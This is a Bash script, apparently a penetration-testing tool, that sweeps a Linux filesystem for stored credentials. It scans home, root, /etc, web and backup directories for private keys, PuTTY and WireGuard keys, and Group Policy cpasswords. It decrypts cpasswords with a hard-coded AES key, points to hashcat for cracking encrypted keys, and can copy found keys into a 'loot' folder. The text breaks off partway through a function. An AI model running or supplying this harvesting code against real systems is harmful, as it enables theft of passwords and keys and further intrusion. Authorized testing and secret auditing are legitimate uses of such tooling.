#!/usr/bin/env bash
# credhunter.sh - internal-pentest credential hunter (Linux)
# Spec: docs/specs/2026-05-24-credhunter-design.md
# Authorized use only.
set -u
shopt -s nullglob 2>/dev/null
shopt -s globstar 2>/dev/null
shopt -s extglob 2>/dev/null

VERSION="1.0.0"
TS="$(date +%Y%m%d-%H%M%S)"
HOSTN="$(hostname 2>/dev/null || echo unknown)"
HOSTN="${HOSTN%%.*}"

WORKER_MODE=0
WORKER_FILE=""

OUT_MODE="both"
OUT_DIR=""
ALL_MODE=0
INC_ARCHIVES=0
INC_OFFICE=0
INC_COMPRESSED=0
INC_TEMP=0
SCAN_SQLITE=0
MAX_SIZE="10M"
MIN_CONF="LOW"
SHOW_SECRETS=0
COLLECT_LOOT=0
SERIAL=0
WORKERS=""
FOLLOW_SYMLINKS=0
CROSS_MOUNTS=0
EXTRA_EXCLUDES=()
EXTRA_INCLUDE_EXT=()
SKIP_KNOWN=0
SKIP_CONTENT=0
QUIET=0
VERBOSE=0
NO_COLOR=0
SCAN_ROOTS=()

DEFAULT_ROOTS=(/home /root /etc /opt /srv /var/www /var/backups /var/log /var/spool /tmp /usr/local/etc)

print_help() {
  cat <<'EOF'
credhunter.sh - internal-pentest credential hunter (Linux)
Usage: credhunter.sh [options] [PATH ...]

  -o, --output {console,file,both}   output mode (default: both)
      --out-dir PATH                 output directory (default: ./credhunter-loot-<host>-<ts>)
      --all                          scan EVERY file extension for hardcoded creds
      --include-archives             recurse into .zip/.tar.gz/.7z (not implemented; flag only)
      --include-office               run text extractors on .pdf/.docx/.xlsx (not implemented)
      --include-compressed           scan .gz/.bz2/.xz logs (not implemented)
      --include-temp                 scan /tmp deeply
      --scan-sqlite                  open SQLite DBs (Login Data, etc.) (not implemented)
      --max-size SIZE                skip files larger than this for content scan (default: 10M)
      --min-confidence {HIGH,MEDIUM,LOW}
      --show-secrets                 print full match values (default redacts)
      --collect-loot                 copy Class A files to ./out-dir/loot/
      --serial                       disable parallelism
      --workers N                    parallel worker count (default: nproc)
      --follow-symlinks              follow symlinks (default off)
      --cross-mounts                 cross filesystem boundaries (default off)
      --exclude PATTERN              additional path/glob to exclude (repeatable)
      --include-ext EXT              additional extension to scan (repeatable)
      --skip-known-locations         skip phase 2
      --skip-content-scan            skip phase 4
  -q, --quiet                        suppress per-phase progress
  -v, --verbose                      verbose tracing
      --no-color                     strip ANSI
  -h, --help                         this help
      --version                      print version

Out of scope (deliberately): API keys, OAuth tokens, JWT, cloud bearer tokens,
generic high-entropy strings. Use trufflehog/gitleaks for those.

Authorized use only - operate under signed rules of engagement.
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    -o|--output) OUT_MODE="${2:-both}"; shift 2 ;;
    --out-dir) OUT_DIR="${2:-}"; shift 2 ;;
    --all) ALL_MODE=1; shift ;;
    --include-archives) INC_ARCHIVES=1; shift ;;
    --include-office) INC_OFFICE=1; shift ;;
    --include-compressed) INC_COMPRESSED=1; shift ;;
    --include-temp) INC_TEMP=1; shift ;;
    --scan-sqlite) SCAN_SQLITE=1; shift ;;
    --max-size) MAX_SIZE="${2:-10M}"; shift 2 ;;
    --min-confidence) MIN_CONF="${2:-LOW}"; shift 2 ;;
    --show-secrets) SHOW_SECRETS=1; shift ;;
    --collect-loot) COLLECT_LOOT=1; shift ;;
    --serial) SERIAL=1; shift ;;
    --workers) WORKERS="${2:-}"; shift 2 ;;
    --follow-symlinks) FOLLOW_SYMLINKS=1; shift ;;
    --cross-mounts) CROSS_MOUNTS=1; shift ;;
    --exclude) EXTRA_EXCLUDES+=("${2:-}"); shift 2 ;;
    --include-ext) EXTRA_INCLUDE_EXT+=("${2:-}"); shift 2 ;;
    --skip-known-locations) SKIP_KNOWN=1; shift ;;
    --skip-content-scan) SKIP_CONTENT=1; shift ;;
    -q|--quiet) QUIET=1; shift ;;
    -v|--verbose) VERBOSE=1; shift ;;
    --no-color) NO_COLOR=1; shift ;;
    -h|--help) print_help; exit 0 ;;
    --version) echo "credhunter $VERSION"; exit 0 ;;
    --__worker) WORKER_MODE=1; WORKER_FILE="${2:-}"; shift 2 ;;
    --) shift; while [[ $# -gt 0 ]]; do SCAN_ROOTS+=("$1"); shift; done ;;
    -*) echo "unknown flag: $1" >&2; exit 2 ;;
    *) SCAN_ROOTS+=("$1"); shift ;;
  esac
done

if [[ "$WORKER_MODE" -eq 1 ]]; then
  OUT_DIR="${CREDHUNTER_OUT_DIR:-$OUT_DIR}"
  MAX_SIZE="${CREDHUNTER_MAX_SIZE:-$MAX_SIZE}"
  SHOW_SECRETS="${CREDHUNTER_SHOW_SECRETS:-$SHOW_SECRETS}"
  MIN_CONF="${CREDHUNTER_MIN_CONF:-$MIN_CONF}"
  INC_TEMP="${CREDHUNTER_INC_TEMP:-$INC_TEMP}"
  HOSTN="${CREDHUNTER_HOSTN:-$HOSTN}"
  USER_NAME="${CREDHUNTER_USER_NAME:-}"
  PRIV="${CREDHUNTER_PRIV:-user}"
  QUIET=1
  NO_COLOR=1
  if [[ -n "${CREDHUNTER_EXTRA_EXCLUDES:-}" ]]; then
    IFS=$'\x1f' read -r -a EXTRA_EXCLUDES <<<"$CREDHUNTER_EXTRA_EXCLUDES"
  fi
fi

[[ ${#SCAN_ROOTS[@]} -eq 0 ]] && SCAN_ROOTS=("${DEFAULT_ROOTS[@]}")
[[ -z "$OUT_DIR" ]] && OUT_DIR="./credhunter-loot-${HOSTN}-${TS}"
if [[ -z "$WORKERS" ]]; then
  WORKERS="$( (nproc 2>/dev/null) || (sysctl -n hw.ncpu 2>/dev/null) || echo 4)"
fi
[[ "$SERIAL" -eq 1 ]] && WORKERS=1

case "$MIN_CONF" in HIGH|MEDIUM|LOW) ;; *) echo "invalid --min-confidence: $MIN_CONF" >&2; exit 2 ;; esac
case "$OUT_MODE" in console|file|both) ;; *) echo "invalid --output: $OUT_MODE" >&2; exit 2 ;; esac

if [[ "$NO_COLOR" -eq 1 || ! -t 1 ]]; then
  C_R=""; C_Y=""; C_C=""; C_D=""; C_B=""; C_X=""
else
  C_R=$'\033[1;31m'
  C_Y=$'\033[1;33m'
  C_C=$'\033[1;36m'
  C_D=$'\033[2m'
  C_B=$'\033[1m'
  C_X=$'\033[0m'
fi

log_info()  { [[ "$QUIET" -eq 0 ]] && printf '%s\n' "$*" >&2 || true; }
log_phase() { [[ "$QUIET" -eq 0 ]] && printf "%s[ %s ]%s %s\n" "$C_D" "$1" "$C_X" "$2" >&2 || true; }
log_warn()  { printf "%s[ warn ]%s %s\n" "$C_Y" "$C_X" "$*" >&2; }
log_err()   { printf "%s[ err  ]%s %s\n" "$C_R" "$C_X" "$*" >&2; }
log_dbg()   { [[ "$VERBOSE" -eq 1 ]] && printf "%s[ dbg  ]%s %s\n" "$C_D" "$C_X" "$*" >&2 || true; }

mkdir -p "$OUT_DIR" 2>/dev/null || { log_err "cannot create output dir: $OUT_DIR"; exit 2; }
OUT_DIR="$(cd "$OUT_DIR" 2>/dev/null && pwd -P || echo "$OUT_DIR")"

FIND_JSONL="$OUT_DIR/findings.jsonl"
FIND_TXT="$OUT_DIR/findings.txt"
SKIPPED_LOG="$OUT_DIR/skipped.log"
RECON_JSON="$OUT_DIR/recon.json"
INODE_FILE="$OUT_DIR/.seen-inodes"
DEDUP_FILE="$OUT_DIR/.seen-dedup"
EXIT_FILE="$OUT_DIR/.exit"

if [[ "$WORKER_MODE" -eq 0 ]]; then
  : > "$FIND_JSONL"
  : > "$FIND_TXT"
  : > "$SKIPPED_LOG"
  : > "$INODE_FILE"
  : > "$DEDUP_FILE"
  echo 0 > "$EXIT_FILE"
fi

HAVE_JQ=0
command -v jq >/dev/null 2>&1 && HAVE_JQ=1
HAVE_SHA256=0
if command -v sha256sum >/dev/null 2>&1; then HAVE_SHA256=1
elif command -v shasum >/dev/null 2>&1; then HAVE_SHA256=2; fi

_sha256() {
  case "$HAVE_SHA256" in
    1) sha256sum | awk '{print $1}' ;;
    2) shasum -a 256 | awk '{print $1}' ;;
    *) cksum | awk '{print $1}' ;;
  esac
}

EUID_NUM="$(id -u 2>/dev/null || echo 0)"
USER_NAME="$(id -un 2>/dev/null || echo unknown)"
PRIV="user"; [[ "$EUID_NUM" -eq 0 ]] && PRIV="root"
OS_NAME="$( ( . /etc/os-release 2>/dev/null && echo "$PRETTY_NAME") 2>/dev/null || uname -s)"

_json_array_roots() {
  local out="" r
  for r in "${SCAN_ROOTS[@]}"; do
    [[ -n "$out" ]] && out+=","
    out+="\"$(printf '%s' "$r" | sed 's/\\/\\\\/g; s/"/\\"/g')\""
  done
  echo "[$out]"
}

if [[ "$WORKER_MODE" -eq 0 ]]; then
  cat > "$RECON_JSON" <<EOF
{"version":"$VERSION","host":"$HOSTN","user":"$USER_NAME","euid":$EUID_NUM,"priv":"$PRIV","os":"$(printf '%s' "$OS_NAME" | sed 's/\\/\\\\/g; s/"/\\"/g')","ts":"$TS","scan_roots":$(_json_array_roots),"workers":$WORKERS,"max_size":"$MAX_SIZE","all_mode":$ALL_MODE}
EOF
fi

if [[ "$WORKER_MODE" -eq 0 && "$QUIET" -eq 0 ]]; then
  printf '\n'
  printf '%scredhunter v%s%s - internal pentest credential hunter\n' "$C_B" "$VERSION" "$C_X"
  printf -- '---------------------------------------------------------------\n'
  printf "%s[ recon ]%s host=%s user=%s(uid=%s) priv=%s os=%s\n" "$C_D" "$C_X" "$HOSTN" "$USER_NAME" "$EUID_NUM" "$PRIV" "$OS_NAME"
  printf "%s[ recon ]%s scan roots: %s\n" "$C_D" "$C_X" "${SCAN_ROOTS[*]}"
  printf "%s[ recon ]%s workers=%s max-size=%s output=%s\n" "$C_D" "$C_X" "$WORKERS" "$MAX_SIZE" "$OUT_DIR"
  printf '\n'
fi

EXCLUDE_PREFIXES=(
  /proc/ /sys/ /dev/ /run/ /var/run/
  /usr/share/locale/ /usr/share/man/ /usr/share/doc/ /usr/share/info/ /usr/share/help/
  /usr/share/fonts/ /usr/share/icons/ /usr/share/themes/ /usr/share/pixmaps/
  /usr/share/sounds/ /usr/share/backgrounds/ /usr/share/zoneinfo/ /usr/share/X11/
  /usr/share/mime/ /usr/share/applications/
  /usr/include/ /usr/lib/firmware/ /usr/lib/modules/ /usr/lib/locale/
  /lib/ /lib32/ /lib64/ /libx32/
  /boot/ /lost+found/ /selinux/ /sysroot/
  /var/cache/apt/ /var/cache/yum/ /var/cache/dnf/ /var/cache/pacman/
  /var/cache/zypper/ /var/cache/apk/ /var/cache/man/ /var/cache/fontconfig/
  /var/lib/apt/ /var/lib/dpkg/ /var/lib/rpm/ /var/lib/pacman/
  /var/lib/snapd/cache/ /var/lib/flatpak/repo/
  /var/log/journal/
  /snap/ /var/lib/docker/overlay2/ /var/lib/docker/image/
  /var/lib/containerd/
  /var/lib/kubelet/pods/
)

EXCLUDE_GLOBS=(
  '*/.cache/*' '*/.thumbnails/*' '*/.local/share/Trash/*'
  '*/.local/share/RecentDocuments/*' '*/.local/share/icons/*'
  '*/.local/share/themes/*' '*/.local/share/fonts/*' '*/.local/share/applications/*'
  '*/.fonts/*' '*/.themes/*' '*/.icons/*'
  '*/.cargo/registry/*' '*/.cargo/git/*' '*/.rustup/toolchains/*'
  '*/.nvm/versions/*' '*/.pyenv/versions/*' '*/.rbenv/versions/*'
  '*/.gem/ruby/*/cache/*' '*/.npm/_cacache/*' '*/.yarn/cache/*'
  '*/.pnpm-store/*' '*/.gradle/caches/*' '*/.m2/repository/*'
  '*/.cache/pip/*' '*/.cache/go-build/*' '*/.cache/yarn/*' '*/.cache/bazel/*'
  '*/.ccache/*' '*/.sccache/*'
  '*/.mozilla/firefox/*/cache2/*' '*/.mozilla/firefox/*/startupCache/*'
  '*/.mozilla/firefox/*/jumpListCache/*' '*/.mozilla/firefox/*/shader-cache/*'
  '*/.mozilla/firefox/*/offlineCache/*'
  '*/.config/google-chrome/*/Cache/*' '*/.config/chromium/*/Cache/*'
  '*/.config/BraveSoftware/*/Cache/*' '*/.config/microsoft-edge/*/Cache/*'
  '*/snap/*/common/.cache/*' '*/.var/app/*/cache/*'
  '*/node_modules/*' '*/vendor/*' '*/target/*' '*/build/*' '*/dist/*' '*/out/*'
  '*/__pycache__/*' '*/.pytest_cache/*' '*/.mypy_cache/*' '*/.tox/*' '*/.eggs/*'
  '*/.terraform/*' '*/.gradle/*' '*/.next/*' '*/.nuxt/*' '*/.svelte-kit/*'
  '*/.angular/*' '*/.parcel-cache/*'
  '*/.git/objects/*' '*/.git/pack/*' '*/.git/lfs/*' '*/.svn/pristine/*' '*/.hg/store/*'
)

SKIP_EXT_REGEX='\.(jpg|jpeg|png|gif|bmp|tiff|tif|ico|webp|heic|heif|raw|cr2|nef|psd|ai|eps|mp3|mp4|mov|avi|mkv|wmv|flv|wav|flac|ogg|opus|webm|m4a|m4v|aac|svg|ttf|otf|woff|woff2|eot|fon|exe|dll|so|dylib|o|a|lib|obj|class|pyc|pyo|pyd|wasm|bin|iso|img|dmg|msi|msu|cab|deb|rpm|snap|appx|appxbundle|efi|sys|db|sqlite|sqlite3|mdb|accdb|dbf|idx|frm|ibd|myd|myi|aof|rdb|pdf|doc|xls|ppt|odt|ods|odp|epub|mobi|azw|azw3|djvu|vsd|vsdx|po|pot|mo|xliff)$'
SKIP_EXT_REGEX_MIN='\.(min\.js|min\.css|map)$'
SKIP_LOCKFILE_REGEX='(^|/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|Pipfile\.lock|poetry\.lock|uv\.lock|Cargo\.lock|Gemfile\.lock|composer\.lock|go\.sum|mix\.lock|flake\.lock|pubspec\.lock)$'

DEFAULT_EXT_REGEX='\.(conf|cnf|cfg|config|ini|properties|toml|yaml|yml|json|xml|plist|env|reg|inf|sh|bash|zsh|ksh|fish|ps1|psm1|psd1|bat|cmd|vbs|vbe|wsf|wsc|py|rb|pl|pm|php|phtml|js|mjs|cjs|ts|tsx|jsx|vue|svelte|java|scala|kt|kts|groovy|go|rs|swift|m|mm|cs|vb|fs|fsx|c|cpp|cc|cxx|h|hpp|lua|r|dart|ex|exs|erl|hs|clj|cljs|htm|html|jsp|jspx|asp|aspx|cshtml|razor|ejs|pug|twig|erb|haml|mustache|hbs|ipynb|rmd|qmd|sql|ddl|dml|psql|mysql|pgsql|tf|tfvars|bicep|log|out|err|trace|bak|backup|old|orig|save|swp|swo|tmp|copy|original|dist|sample|example)$'

DEFAULT_EXT_NAMES='^(Dockerfile|Containerfile|Jenkinsfile|Makefile|GNUmakefile|\.env|\.gitlab-ci\.yml|\.travis\.yml|docker-compose\.ya?ml|compose\.ya?ml|azure-pipelines\.yml|bitbucket-pipelines\.yml|cloudbuild\.yaml|buildspec\.yml|pom\.xml|package\.json)$'

is_excluded() {
  local p="$1"
  local pp gg
  for pp in "${EXCLUDE_PREFIXES[@]}"; do
    case "$p" in "$pp"*) return 0 ;; esac
  done
  for gg in "${EXCLUDE_GLOBS[@]}"; do
    case "$p" in $gg) return 0 ;; esac
  done
  if [[ ${#EXTRA_EXCLUDES[@]} -gt 0 ]]; then
    for gg in "${EXTRA_EXCLUDES[@]}"; do
      case "$p" in $gg) return 0 ;; esac
    done
  fi
  if [[ "$INC_TEMP" -eq 0 ]]; then
    case "$p" in /tmp/.cache/*|*/Temp/*) return 0 ;; esac
  fi
  return 1
}

is_binary() {
  local f="$1"
  local bom
  bom="$(head -c 4 "$f" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
  case "$bom" in
    efbbbf*) return 1 ;;
    fffe0000|0000feff) return 1 ;;
    fffe*|feff*) return 1 ;;
  esac
  local nul_count
  nul_count="$(head -c 8192 "$f" 2>/dev/null | LC_ALL=C tr -cd '\000' | LC_ALL=C wc -c | tr -d ' ')"
  [[ -z "$nul_count" ]] && nul_count=0
  if [[ "$nul_count" -gt 0 ]]; then
    return 0
  fi
  return 1
}

size_under_cap() {
  local f="$1" max="$2"
  local bytes
  bytes="$(stat -c '%s' "$f" 2>/dev/null || stat -f '%z' "$f" 2>/dev/null)" || return 1
  local n unit max_bytes
  n="${max%[KMGkmg]*}"
  unit="${max: -1}"
  case "$unit" in
    K|k) max_bytes=$(( n * 1024 )) ;;
    M|m) max_bytes=$(( n * 1024 * 1024 )) ;;
    G|g) max_bytes=$(( n * 1024 * 1024 * 1024 )) ;;
    *) max_bytes="$max" ;;
  esac
  [[ "$bytes" -le "$max_bytes" ]]
}

seen_inode_check() {
  local f="$1"
  local key
  key="$(stat -c '%d:%i' "$f" 2>/dev/null || stat -f '%d:%i' "$f" 2>/dev/null)" || return 1
  [[ -z "$key" ]] && return 1
  if grep -qxF -- "$key" "$INODE_FILE" 2>/dev/null; then return 0; fi
  printf '%s\n' "$key" >> "$INODE_FILE"
  return 1
}

walk() {
  local root="$1"
  local find_args=()
  if [[ "$FOLLOW_SYMLINKS" -eq 1 ]]; then find_args+=(-L); fi
  find_args+=("$root")
  if [[ "$CROSS_MOUNTS" -eq 0 ]]; then find_args+=(-xdev); fi
  find_args+=(-type f)
  find "${find_args[@]}" 2>/dev/null | while IFS= read -r f; do
    [[ -z "$f" ]] && continue
    if is_excluded "$f"; then
      [[ "$VERBOSE" -eq 1 ]] && printf '%s\texcluded\n' "$f" >> "$SKIPPED_LOG"
      continue
    fi
    printf '%s\n' "$f"
  done
}

PLACEHOLDERS=(
  password passw0rd 'p@ssw0rd' 'p@ssword' pass passwd pwd secret test testing
  changeme change-me change_me changeit default defaultpassword
  your_password yourpassword yoursecret your-secret-here your_password_here
  example examplepassword sample samplepassword dummy placeholder
  redacted xxx xxxx xxxxx xxxxxx xxxxxxxx '***' '****' '********'
  '<password>' '[password]' '{password}' '{{password}}' '${password}'
  '%password%' '$password' '$passwd' '$secret'
  'null' none nil 'n/a' na tbd todo fixme '???' '!!!'
  foo bar foobar hello world helloworld
  insert_password enter_password type_password_here secret_here password_here
  my_password mypassword admin administrator root user guest anonymous
  '123456' '12345678' qwerty abc123 letmein monkey dragon
)

is_placeholder() {
  local v="$1"
  v="$(printf '%s' "$v" | sed -e 's/^[[:space:]\"'\''`]*//' -e 's/[[:space:]\"'\''`]*$//')"
  local v_lower
  v_lower="$(printf '%s' "$v" | tr '[:upper:]' '[:lower:]')"
  local p
  for p in "${PLACEHOLDERS[@]}"; do
    [[ "$v_lower" == "$p" ]] && return 0
  done
  return 1
}

entropy() {
  local s="$1"
  [[ -z "$s" ]] && { printf '0.00'; return; }
  awk -v s="$s" 'BEGIN{
    n=length(s)
    if (n==0) { printf "0.00"; exit }
    for (i=1; i<=n; i++) c[substr(s,i,1)]++
    H=0
    for (k in c) { p=c[k]/n; H -= p*log(p)/log(2) }
    printf "%.2f", H
  }'
}

is_test_path() {
  case "$1" in
    */test/*|*/tests/*|*/spec/*|*/specs/*|*/fixture/*|*/fixtures/*|*/sample/*|*/samples/*|\
*/example/*|*/examples/*|*/demo/*|*/demos/*|*/mock/*|*/mocks/*|*/__tests__/*|*/__mocks__/*|\
*/e2e/*|*/testdata/*|*/test-data/*|*/testresources/*|\
*_test.*|*.test.*|*.spec.*|*_spec.*|*.example.*|*.sample.*|*.demo.*) return 0 ;;
  esac
  return 1
}

is_comment() {
  local line
  line="$(printf '%s' "$1" | sed 's/^[[:space:]]*//')"
  case "$line" in
    '#'*|'//'*|'--'*|';'*|'%'*|'<!--'*|'/*'*|'"""'*|"'''"*|'<#'*) return 0 ;;
  esac
  return 1
}

is_env_ref() {
  local v="$1"
  case "$v" in
    '${'*|'<%'*|'%('*|'{{'*|'<%='*) return 0 ;;
    *'os.environ'*|*'process.env'*|*'ENV['*|*'System.getenv'*) return 0 ;;
    '$'[A-Z_]*) return 0 ;;
  esac
  return 1
}

is_identifier() {
  local v="$1"
  [[ "$v" =~ ^[A-Za-z_\$][A-Za-z0-9_.\$]*$ ]]
}

demote_tier() {
  case "$1" in
    HIGH) echo "MEDIUM" ;;
    MEDIUM) echo "LOW" ;;
    *) echo "LOW" ;;
  esac
}

conf_to_rank() {
  case "$1" in HIGH) echo 3 ;; MEDIUM) echo 2 ;; *) echo 1 ;; esac
}

passes_min_conf() {
  local c="$1"
  local r_have r_min
  r_have="$(conf_to_rank "$c")"
  r_min="$(conf_to_rank "$MIN_CONF")"
  [[ "$r_have" -ge "$r_min" ]]
}

json_escape() {
  local s="$1"
  s="${s//\\/\\\\}"
  s="${s//\"/\\\"}"
  s="${s//$'\t'/\\t}"
  s="${s//$'\r'/\\r}"
  s="${s//$'\n'/\\n}"
  printf '%s' "$s"
}

redact() {
  local s="$1"
  local len=${#s}
  if [[ "$SHOW_SECRETS" -eq 1 ]]; then printf '%s' "$s"; return; fi
  if [[ "$len" -le 4 ]]; then printf '****'; return; fi
  local stars
  stars="$(printf '%*s' $(( len - 4 )) '' | tr ' ' '*')"
  printf '%s%s%s' "${s:0:2}" "$stars" "${s: -2}"
}

truncate_line() {
  local s="$1" max="${2:-512}"
  if [[ ${#s} -gt "$max" ]]; then
    printf '%s...' "${s:0:$max}"
  else
    printf '%s' "$s"
  fi
}

_lock() {
  local lock="$OUT_DIR/.lock"
  local i=0
  while ! ( set -o noclobber; : > "$lock" ) 2>/dev/null; do
    i=$(( i + 1 ))
    [[ "$i" -gt 5000 ]] && { rm -f "$lock" 2>/dev/null; break; }
    sleep 0.001 2>/dev/null || true
  done
}

_unlock() {
  rm -f "$OUT_DIR/.lock" 2>/dev/null
}

emit_finding() {
  declare -A F=()
  local kv k v
  while [[ $# -gt 0 ]]; do
    kv="$1"; shift
    k="${kv%%=*}"
    v="${kv#*=}"
    F[$k]="$v"
  done

  local conf="${F[conf]:-LOW}"
  passes_min_conf "$conf" || return 0

  local path="${F[path]:-}"
  local rule_id="${F[rule_id]:-unknown}"
  local line_no="${F[line_no]:-0}"
  local match_text="${F[match_text]:-}"
  local line_text="${F[line_text]:-}"
  local key_name="${F[key_name]:-}"
  local fp_reason="${F[fp_reason]:-}"
  local entropy_val="${F[entropy]:-0}"
  local demotions="${F[demotions]:-}"
  local base_conf="${F[base_conf]:-$conf}"
  local category="${F[category]:-PASSWORD}"
  local notes="${F[notes]:-}"

  local dedup_key
  dedup_key="$(printf '%s|%s|%s|%s' "$rule_id" "$path" "$line_no" "$match_text" | _sha256)"

  _lock
  if grep -qxF -- "$dedup_key" "$DEDUP_FILE" 2>/dev/null; then
    _unlock
    return 0
  fi
  printf '%s\n' "$dedup_key" >> "$DEDUP_FILE"

  local mtime size mode owner
  if [[ -n "$path" && -e "$path" ]]; then
    mtime="$(stat -c '%y' "$path" 2>/dev/null || stat -f '%Sm' "$path" 2>/dev/null || echo '')"
    size="$(stat -c '%s' "$path" 2>/dev/null || stat -f '%z' "$path" 2>/dev/null || echo 0)"
    mode="$(stat -c '%a' "$path" 2>/dev/null || stat -f '%Mp%Lp' "$path" 2>/dev/null || echo '')"
    owner="$(stat -c '%U' "$path" 2>/dev/null || stat -f '%Su' "$path" 2>/dev/null || echo '')"
  fi

  local redacted match_for_report
  redacted="$(redact "$match_text")"
  if [[ "$SHOW_SECRETS" -eq 1 ]]; then
    match_for_report="$match_text"
  else
    match_for_report="$redacted"
  fi

  local truncated_line truncated_match
  truncated_line="$(truncate_line "$line_text" 4096)"
  truncated_match="$(truncate_line "$match_text" 4096)"

  if [[ "$HAVE_JQ" -eq 1 ]]; then
    jq -nc \
      --arg rule_id "$rule_id" \
      --arg cat "$category" \
      --arg conf "$conf" \
      --arg bconf "$base_conf" \
      --arg dem "$demotions" \
      --arg host "$HOSTN" \
      --arg user "$USER_NAME" \
      --arg priv "$PRIV" \
      --arg path "$path" \
      --arg ln "$line_no" \
      --arg ltext "$truncated_line" \
      --arg mtxt "$truncated_match" \
      --arg redacted "$redacted" \
      --arg key "$key_name" \
      --arg fp "$fp_reason" \
      --arg ent "$entropy_val" \
      --arg mtime "${mtime:-}" \
      --arg size "${size:-0}" \
      --arg mode "${mode:-}" \
      --arg owner "${owner:-}" \
      --arg dedup "$dedup_key" \
      --arg notes "$notes" \
      '{rule_id:$rule_id,category:$cat,confidence:$conf,base_confidence:$bconf,demotions:($dem|split(",")|map(select(length>0))),host:$host,scan_user:$user,scan_user_priv:$priv,abs_path:$path,line_no:(($ln|tonumber)? // 0),line_text:$ltext,match_text:$mtxt,match_redacted:$redacted,key_name:$key,fp_reason:$fp,entropy:(($ent|tonumber)? // 0),file_mtime:$mtime,file_size:(($size|tonumber)? // 0),file_mode:$mode,file_owner:$owner,dedup_key:$dedup,notes:$notes}' \
      >> "$FIND_JSONL" 2>/dev/null || true
  else
    {
      printf '{'
      printf '"rule_id":"%s",' "$(json_escape "$rule_id")"
      printf '"category":"%s",' "$(json_escape "$category")"
      printf '"confidence":"%s",' "$conf"
      printf '"base_confidence":"%s",' "$base_conf"
      printf '"host":"%s",' "$(json_escape "$HOSTN")"
      printf '"scan_user":"%s",' "$(json_escape "$USER_NAME")"
      printf '"abs_path":"%s",' "$(json_escape "$path")"
      printf '"line_no":%s,' "${line_no:-0}"
      printf '"match_redacted":"%s",' "$(json_escape "$redacted")"
      printf '"key_name":"%s",' "$(json_escape "$key_name")"
      printf '"fp_reason":"%s",' "$(json_escape "$fp_reason")"
      printf '"dedup_key":"%s"' "$dedup_key"
      printf '}\n'
    } >> "$FIND_JSONL"
  fi

  {
    printf '[%s] %-26s %s' "$conf" "$rule_id" "$path"
    [[ -n "$line_no" && "$line_no" != "0" ]] && printf ':%s' "$line_no"
    printf '\n'
    if [[ -n "$match_text" ]]; then
      printf '       %s\n' "$match_for_report"
    fi
    if [[ -n "$key_name" ]]; then
      printf '       key: %s\n' "$key_name"
    fi
    if [[ -n "$fp_reason" ]]; then
      printf '       fp_reason: %s\n' "$fp_reason"
    fi
    if [[ -n "$notes" ]]; then
      printf '       notes: %s\n' "$notes"
    fi
  } >> "$FIND_TXT"

  _unlock
  echo 1 > "$EXIT_FILE"
  return 0
}

decrypt_gpp_cpassword() {
  local b64="$1"
  local pad=$(( 4 - ${#b64} % 4 ))
  [[ "$pad" -eq 4 ]] && pad=0
  local padded="$b64"
  local i
  for ((i=0; i<pad; i++)); do padded+="="; done
  local out
  out="$(printf '%s' "$padded" | base64 -d 2>/dev/null \
    | openssl enc -d -aes-256-cbc -nopad \
        -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b \
        -iv 00000000000000000000000000000000 2>/dev/null \
    | iconv -f UTF-16LE -t UTF-8 2>/dev/null \
    | LC_ALL=C tr -d '\000-\010\013\014\016-\037\177-\377')"
  printf '%s' "$out"
}

decode_b64_simple() {
  local b64="$1"
  printf '%s' "$b64" | base64 -d 2>/dev/null
}

url_decode() {
  local s="$1"
  s="${s//+/ }"
  printf '%b' "${s//%/\\x}"
}

html_decode() {
  local s="$1"
  s="${s//&amp;/&}"
  s="${s//&lt;/<}"
  s="${s//&gt;/>}"
  s="${s//&quot;/\"}"
  s="${s//&#39;/\'}"
  printf '%s' "$s"
}

rule_pem() {
  local f="$1"
  grep -qE -- '-----BEGIN ([A-Z2 ]+ )?PRIVATE KEY-----' "$f" 2>/dev/null || return 0
  local marker enc lno
  marker="$(grep -oE -- '-----BEGIN ([A-Z2 ]+ )?PRIVATE KEY-----' "$f" 2>/dev/null | head -1)"
  lno="$(grep -nE -- '-----BEGIN ([A-Z2 ]+ )?PRIVATE KEY-----' "$f" 2>/dev/null | head -1 | cut -d: -f1)"
  enc="no"
  if grep -qE -- '^(Proc-Type: 4,ENCRYPTED|DEK-Info:)' "$f" 2>/dev/null; then enc="yes"; fi
  if grep -qE -- '-----BEGIN ENCRYPTED PRIVATE KEY-----' "$f" 2>/dev/null; then enc="yes"; fi
  local notes=""
  if [[ "$enc" == "yes" ]]; then
    notes="encrypted - run: ssh2john / pem2john + hashcat"
  fi
  emit_finding rule_id=pem.private_key category=PRIVATE_KEY conf=HIGH base_conf=HIGH \
    path="$f" line_no="${lno:-1}" line_text="$marker" match_text="$marker" \
    key_name="encrypted=$enc" notes="$notes"
}

rule_ppk() {
  local f="$1"
  local first
  first="$(head -1 "$f" 2>/dev/null)"
  case "$first" in
    PuTTY-User-Key-File-2:*|PuTTY-User-Key-File-3:*)
      local enc="no"
      grep -qE '^Encryption:[[:space:]]*(aes|none)' "$f" 2>/dev/null && {
        local algo
        algo="$(grep -E '^Encryption:' "$f" 2>/dev/null | head -1 | awk '{print $2}')"
        [[ "$algo" != "none" ]] && enc="yes"
      }
      local notes=""
      [[ "$enc" == "yes" ]] && notes="encrypted - run: putty2john + hashcat -m 22931"
      emit_finding rule_id=putty.ppk category=PRIVATE_KEY conf=HIGH base_conf=HIGH \
        path="$f" line_no=1 line_text="$first" match_text="PuTTY PPK" key_name="encrypted=$enc" notes="$notes"
      ;;
  esac
}

rule_wireguard() {
  local f="$1"
  grep -Eno -- '^[[:space:]]*PrivateKey[[:space:]]*=[[:space:]]*[A-Za-z0-9+/]{43}=' "$f" 2>/dev/null \
  | while IFS=: read -r lno match; do
      local val
      val="$(printf '%s' "$match" | sed -E 's/^[[:space:]]*PrivateKey[[:space:]]*=[[:space:]]*//')"
      emit_finding rule_id=wireguard.privkey category=PRIVATE_KEY conf=HIGH base_conf=HIGH \
        path="$f" line_no="$lno" line_text="$match" match_text="$val" key_name="PrivateKey"
    done
}

rule_gpp_cpassword() {
  local f="$1"
  grep -Eno -- 'cpassword[[:space:]]*=[[:space:]]*"[A-Za-z0-9+/]{8,}={0,2}"' "$f" 2>/dev/null \
  | while IFS=: read -r lno match; do
      local b64
      b64="$(printf '%s' "$match" | sed -E 's/.*cpassword[[:space:]]*=[[:space:]]*"([^"]+)".*/\1/')"
      [[ -z "$b64" ]] && continue
      emit_finding rule_id=gpp.cpassword category=PASSWORD conf=HIGH base_conf=HIGH \
